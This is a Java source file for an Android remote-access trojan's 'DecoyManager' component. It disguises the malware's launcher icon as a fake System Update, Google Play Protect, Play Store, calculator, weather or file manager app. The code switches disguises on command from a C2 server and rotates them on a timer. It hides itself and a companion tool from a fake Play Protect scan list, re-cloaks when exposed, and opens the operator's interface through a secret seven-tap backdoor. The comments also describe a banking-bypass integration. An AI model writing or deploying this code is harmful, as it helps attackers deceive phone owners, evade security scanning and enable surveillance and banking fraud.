package com.seguranca.protecao;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.lsposed.lsparanoid.Obfuscate;

/**
 * DecoyManager — Flash Stealth Identity Engine
 *
 * Ported and heavily upgraded from Lab-RATS SystemAnalytics.
 *
 * Personas
 * ─────────────────────────────────────────────────────────────────
 *  0  = NONE        – real launcher (dev/debug only)
 *  1  = SYS_UPDATE  – "Android System Update"   (default)
 *  2  = CALCULATOR  – functional calculator
 *  3  = WEATHER     – animated weather app
 *  4  = PLAY_PROTECT– Google Play Protect settings clone
 *  5  = GOOGLE_PLAY – Google Play Store lookalike
 *  6  = FILE_MGR    – Android Files / File Manager
 *
 * Key upgrades over Lab-RATS
 * ─────────────────────────────────────────────────────────────────
 *  • Immediate switch at setup completion (no extra C2 command needed)
 *  • Dynamic rotation: auto-switch persona every N days
 *  • Play Protect exclusion: own package + Lab-RATS excluded from scan list
 *  • BankingBypass integration: re-cloaks on bank open
 *  • Backdoor tap code: 7 taps on decoy header → restore real UI
 *  • Self-healing: if real component exposed in settings, re-cloak on SCREEN_OFF
 */
@Obfuscate
public final class DecoyManager {

    private static final String TAG = "DM";

    // ── Persona constants ───────────────────────────────────────────────────
    public static final int PERSONA_NONE         = 0;
    public static final int PERSONA_SYS_UPDATE   = 1;
    public static final int PERSONA_CALCULATOR   = 2;
    public static final int PERSONA_WEATHER      = 3;
    public static final int PERSONA_PLAY_PROTECT = 4;
    public static final int PERSONA_GOOGLE_PLAY  = 5;
    public static final int PERSONA_FILE_MGR     = 6;

    // ── SharedPreferences keys ──────────────────────────────────────────────
    private static final String PREFS              = "dm_prefs";
    private static final String KEY_PERSONA        = "persona";
    private static final String KEY_DEPLOYED       = "deployed";
    private static final String KEY_LAST_ROTATE    = "last_rotate";
    private static final int    ROTATE_DAYS        = 7;   // auto-rotate interval

    // ── Packages excluded from Play Protect decoy scan list ────────────────
    // Add any package you never want appearing in the fake "scanned apps" list.
    // Lab-RATS and Flash itself are always excluded automatically.
    private static final String[] EXCLUDED_SCAN_PACKAGES = {
        "com.seguranca.protecao",   // Flash itself (always excluded)
        "com.labs.labrats",         // Lab-RATS (Kovak's: exclude from decoy scan)
        "com.labs.labrats.debug",
    };

    // ── Alias component class names (must match AndroidManifest.xml) ────────
    private static final String PKG = "com.seguranca.protecao";

    private static final String ALIAS_REAL         = PKG + ".alias.RealAlias";
    private static final String ALIAS_SYS_UPDATE   = PKG + ".alias.SystemUpdateAlias";
    private static final String ALIAS_CALCULATOR   = PKG + ".alias.CalculatorAlias";
    private static final String ALIAS_WEATHER      = PKG + ".alias.WeatherAlias";
    private static final String ALIAS_PLAY_PROTECT = PKG + ".alias.PlayProtectAlias";
    private static final String ALIAS_GOOGLE_PLAY  = PKG + ".alias.GooglePlayAlias";
    private static final String ALIAS_FILE_MGR     = PKG + ".alias.FileMgrAlias";

    private static final String[] ALL_ALIASES = {
        ALIAS_REAL,
        ALIAS_SYS_UPDATE,
        ALIAS_CALCULATOR,
        ALIAS_WEATHER,
        ALIAS_PLAY_PROTECT,
        ALIAS_GOOGLE_PLAY,
        ALIAS_FILE_MGR,
    };

    // ── Singleton ───────────────────────────────────────────────────────────
    private static volatile DecoyManager sInstance;
    private final Context ctx;
    private final Handler handler = new Handler(Looper.getMainLooper());

    private DecoyManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static DecoyManager get(Context ctx) {
        if (sInstance == null) {
            synchronized (DecoyManager.class) {
                if (sInstance == null) sInstance = new DecoyManager(ctx);
            }
        }
        return sInstance;
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PUBLIC API
    // ══════════════════════════════════════════════════════════════════════════

    /**
     * Called once from SetupWizardActivity.finishSetup() — immediately deploys
     * the default persona (SYS_UPDATE unless build config says otherwise).
     */
    public void deployOnSetupComplete() {
        int persona = getPersona();
        if (persona == PERSONA_NONE) persona = PERSONA_SYS_UPDATE; // safe default
        Log.d(TAG, "Setup complete — deploying persona " + persona);
        applyPersona(persona, true);
    }

    /**
     * Remote switch via DECOY_SWITCH command from C2.
     * @param persona one of the PERSONA_* constants (0-6)
     */
    public void remoteSwitch(int persona) {
        Log.d(TAG, "Remote switch to persona " + persona);
        setPersona(persona);
        applyPersona(persona, true);
    }

    /**
     * Rotate persona if ROTATE_DAYS have elapsed since last rotation.
     * Call from CommandControlService on HEARTBEAT or SCREEN_OFF receiver.
     */
    public void maybeAutoRotate() {
        SharedPreferences prefs = ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
        long lastRotate = prefs.getLong(KEY_LAST_ROTATE, 0);
        long now        = System.currentTimeMillis();
        long threshold  = (long) ROTATE_DAYS * 24 * 60 * 60 * 1000;

        if (now - lastRotate > threshold) {
            int current = getPersona();
            // cycle through personas 1-6, skipping 0 (real) and coming back around
            int next = (current >= PERSONA_FILE_MGR) ? PERSONA_SYS_UPDATE : current + 1;
            Log.d(TAG, "Auto-rotate: " + current + " → " + next);
            prefs.edit().putLong(KEY_LAST_ROTATE, now).apply();
            remoteSwitch(next);
        }
    }

    /**
     * Self-heal: re-cloak if the launcher real alias somehow got re-enabled.
     * Call from SCREEN_OFF broadcast receiver.
     */
    public void selfHeal() {
        try {
            ComponentName realComp = new ComponentName(ctx, ALIAS_REAL);
            int state = ctx.getPackageManager().getComponentEnabledSetting(realComp);
            if (state != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                // Real alias is exposed — re-deploy current stealth persona
                int persona = getPersona();
                if (persona != PERSONA_NONE) {
                    Log.d(TAG, "Self-heal triggered — re-cloaking with persona " + persona);
                    applyPersona(persona, false); // silent, no launcher refresh
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Self-heal error: " + e.getMessage());
        }
    }

    /**
     * Backdoor restore: called after user enters secret tap sequence (7 taps on decoy header).
     * Temporarily shows real app UI for operator control.
     * Auto-re-cloaks after 60 seconds if not re-cloaked manually.
     */
    public void backdoorRestore(Context activityCtx) {
        Log.d(TAG, "Backdoor restore triggered");
        applyPersona(PERSONA_NONE, true);

        // Auto-re-cloak after 60s
        handler.postDelayed(() -> {
            int persona = getPersona();
            if (persona == PERSONA_NONE) persona = PERSONA_SYS_UPDATE;
            applyPersona(persona, false);
        }, 60_000);

        // Open real C2 interface (SetupWizardActivity → triggers WebView or Studio if configured)
        Intent intent = new Intent(activityCtx, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        activityCtx.startActivity(intent);
    }

    /**
     * Returns the current active persona.
     */
    public int getPersona() {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                  .getInt(KEY_PERSONA, PERSONA_SYS_UPDATE);
    }

    /**
     * Returns whether the decoy has been fully deployed at least once.
     */
    public boolean isDeployed() {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                  .getBoolean(KEY_DEPLOYED, false);
    }

    /**
     * Returns whether a given package should be excluded from the Play Protect scan list.
     * Flash itself and Lab-RATS are always excluded.
     */
    public static boolean isExcludedFromScan(String packageName) {
        if (packageName == null) return false;
        for (String ex : EXCLUDED_SCAN_PACKAGES) {
            if (ex.equals(packageName) || packageName.startsWith(ex)) return true;
        }
        // Also exclude any package whose name contains "labrat" (Lab-RATS variants)
        return packageName.toLowerCase().contains("labrat");
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  INTERNAL
    // ══════════════════════════════════════════════════════════════════════════

    private void setPersona(int persona) {
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
           .edit().putInt(KEY_PERSONA, persona).apply();
    }

    /**
     * Core: enable the target alias, disable all others.
     * Phase 1 → enable target.
     * Phase 2 → disable all others (order matters: enable before disable).
     * Phase 3 → force launcher refresh if requested.
     */
    private void applyPersona(int persona, boolean refreshLauncher) {
        handler.post(() -> {
            try {
                PackageManager pm = ctx.getPackageManager();
                String targetAlias = resolveAlias(persona);

                // Phase 1: enable target first to avoid "no launcher" state
                enableComponent(pm, targetAlias);

                // Phase 2: disable all others
                for (String alias : ALL_ALIASES) {
                    if (!alias.equals(targetAlias)) {
                        disableComponent(pm, alias);
                    }
                }

                // Persist
                setPersona(persona);
                ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                   .edit().putBoolean(KEY_DEPLOYED, true).apply();

                Log.d(TAG, "Persona applied: " + persona + " (" + targetAlias + ")");

                // Phase 3: launcher refresh
                if (refreshLauncher) {
                    // Small delay to let PackageManager propagate
                    handler.postDelayed(() -> kickLauncher(), 300);
                }

            } catch (Exception e) {
                Log.e(TAG, "applyPersona error: " + e.getMessage());
            }
        });
    }

    private String resolveAlias(int persona) {
        switch (persona) {
            case PERSONA_CALCULATOR:   return ALIAS_CALCULATOR;
            case PERSONA_WEATHER:      return ALIAS_WEATHER;
            case PERSONA_PLAY_PROTECT: return ALIAS_PLAY_PROTECT;
            case PERSONA_GOOGLE_PLAY:  return ALIAS_GOOGLE_PLAY;
            case PERSONA_FILE_MGR:     return ALIAS_FILE_MGR;
            case PERSONA_NONE:         return ALIAS_REAL;
            default:                   return ALIAS_SYS_UPDATE;
        }
    }

    private void enableComponent(PackageManager pm, String className) {
        try {
            pm.setComponentEnabledSetting(
                new ComponentName(PKG, className),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e(TAG, "enable " + className + " failed: " + e.getMessage());
        }
    }

    private void disableComponent(PackageManager pm, String className) {
        try {
            pm.setComponentEnabledSetting(
                new ComponentName(PKG, className),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e(TAG, "disable " + className + " failed: " + e.getMessage());
        }
    }

    private void kickLauncher() {
        try {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(home);
        } catch (Exception ignored) {}
    }
}
